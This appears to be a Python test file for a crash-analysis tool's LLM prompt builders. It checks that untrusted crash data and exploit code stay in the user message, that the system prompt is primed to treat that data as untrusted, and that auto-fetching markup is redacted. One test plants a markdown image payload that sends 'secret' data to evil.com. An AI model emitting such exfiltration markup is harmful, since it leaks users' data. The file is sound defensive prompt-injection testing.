"""Tests that dialogue.py prompt builders use the defense envelope correctly.

Verifies:
- Build methods return PromptBundle (role-separated)
- Untrusted content lands in user message, not system
- System message contains envelope priming
- Callers pass system_prompt separately to LLM
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Optional
from unittest.mock import MagicMock, patch

import pytest

from core.security.prompt_envelope import PromptBundle


@dataclass
class FakeCrashContext:
    signal: int = 11
    function_name: Optional[str] = "vuln_func"
    stack_trace: str = "STACK_TRACE_MARKER_abc123"
    registers: str = "RAX=0xdeadbeef RBX=0x41414141"
    binary_info: dict = field(default_factory=lambda: {"aslr_enabled": True})
    size: int = 256


class TestBuildMethodsReturnBundle:

    def test_initial_crash_prompt_returns_bundle(self):
        from packages.autonomous.dialogue import MultiTurnAnalyser
        analyser = MultiTurnAnalyser(llm_client=MagicMock())
        result = analyser._build_initial_crash_prompt(FakeCrashContext())
        assert isinstance(result, PromptBundle)

    def test_clarification_prompt_returns_bundle(self):
        from packages.autonomous.dialogue import MultiTurnAnalyser
        analyser = MultiTurnAnalyser(llm_client=MagicMock())
        result = analyser._build_clarification_prompt(
            {"exploitability": "high"}, FakeCrashContext(),
        )
        assert isinstance(result, PromptBundle)

    def test_refinement_prompt_returns_bundle(self):
        from packages.autonomous.dialogue import MultiTurnAnalyser
        analyser = MultiTurnAnalyser(llm_client=MagicMock())
        result = analyser._build_refinement_prompt(
            "int main() { return 0; }", ["undefined reference"], FakeCrashContext(), 1,
        )
        assert isinstance(result, PromptBundle)


class TestRoleSeparation:

    def test_untrusted_in_user_not_system(self):
        from packages.autonomous.dialogue import MultiTurnAnalyser
        analyser = MultiTurnAnalyser(llm_client=MagicMock())
        bundle = analyser._build_initial_crash_prompt(FakeCrashContext())

        system = next(m.content for m in bundle.messages if m.role == "system")
        user = next(m.content for m in bundle.messages if m.role == "user")

        assert "STACK_TRACE_MARKER_abc123" not in system
        assert "STACK_TRACE_MARKER_abc123" in user

    def test_system_contains_priming(self):
        from packages.autonomous.dialogue import MultiTurnAnalyser
        analyser = MultiTurnAnalyser(llm_client=MagicMock())
        bundle = analyser._build_initial_crash_prompt(FakeCrashContext())

        system = next(m.content for m in bundle.messages if m.role == "system")
        assert "untrusted" in system.lower()

    def test_slots_in_user_message(self):
        from packages.autonomous.dialogue import MultiTurnAnalyser
        analyser = MultiTurnAnalyser(llm_client=MagicMock())
        bundle = analyser._build_initial_crash_prompt(FakeCrashContext())

        user = next(m.content for m in bundle.messages if m.role == "user")
        assert "vuln_func" in user
        assert "slot" in user.lower()

    def test_refinement_code_quarantined(self):
        from packages.autonomous.dialogue import MultiTurnAnalyser
        analyser = MultiTurnAnalyser(llm_client=MagicMock())
        exploit = "EXPLOIT_CODE_XYZ_789"
        bundle = analyser._build_refinement_prompt(
            exploit, ["error: foo"], FakeCrashContext(), 2,
        )

        system = next(m.content for m in bundle.messages if m.role == "system")
        user = next(m.content for m in bundle.messages if m.role == "user")

        assert exploit not in system
        assert exploit in user


class TestCallerPassesSystemPrompt:

    def test_analyse_crash_passes_system_prompt(self):
        from packages.autonomous.dialogue import MultiTurnAnalyser

        mock_llm = MagicMock()
        mock_response = MagicMock()
        mock_response.content = "This is a buffer overflow. High exploitability."
        mock_llm.generate.return_value = mock_response

        analyser = MultiTurnAnalyser(llm_client=mock_llm)
        analyser.analyse_crash_deeply(FakeCrashContext(), max_turns=1)

        call_kwargs = mock_llm.generate.call_args
        assert "system_prompt" in call_kwargs.kwargs
        assert call_kwargs.kwargs["system_prompt"] is not None
        assert "untrusted" in call_kwargs.kwargs["system_prompt"].lower()

    def test_ask_strategic_question_passes_system_prompt(self):
        from packages.autonomous.dialogue import MultiTurnAnalyser

        mock_llm = MagicMock()
        mock_response = MagicMock()
        mock_response.content = "Continue fuzzing."
        mock_llm.generate.return_value = mock_response

        analyser = MultiTurnAnalyser(llm_client=mock_llm)
        analyser.ask_strategic_question("Should I stop?", {"crashes": "5"})

        call_kwargs = mock_llm.generate.call_args
        assert "system_prompt" in call_kwargs.kwargs
        assert call_kwargs.kwargs["system_prompt"] is not None


class TestEnvelopeTagsPresent:

    def test_nonce_tags_in_user_message(self):
        from packages.autonomous.dialogue import MultiTurnAnalyser
        analyser = MultiTurnAnalyser(llm_client=MagicMock())
        bundle = analyser._build_initial_crash_prompt(FakeCrashContext())

        user = next(m.content for m in bundle.messages if m.role == "user")
        assert "<untrusted-" in user
        assert "kind=" in user

    def test_autofetch_markup_stripped(self):
        from packages.autonomous.dialogue import MultiTurnAnalyser
        analyser = MultiTurnAnalyser(llm_client=MagicMock())
        ctx = FakeCrashContext()
        ctx.stack_trace = 'normal trace ![exfil](http://evil.com?data=secret)'
        bundle = analyser._build_initial_crash_prompt(ctx)

        user = next(m.content for m in bundle.messages if m.role == "user")
        assert "evil.com" not in user
        assert "REDACTED-AUTOFETCH-MARKUP" in user
